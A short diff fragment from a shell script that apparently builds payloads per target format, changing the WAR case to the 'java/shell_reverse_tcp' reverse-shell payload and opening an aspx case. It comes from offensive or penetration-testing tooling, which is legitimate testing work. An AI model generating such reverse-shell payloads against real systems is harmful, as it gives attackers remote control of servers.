@@ -27,7 +27,7 @@ fi
 
 case "$TYPE" in
   "war")
-    PAYLOAD=java/reverse/reverse_tcp
+    PAYLOAD=java/shell_reverse_tcp
     FORMAT=war
     ;;
   "aspx")
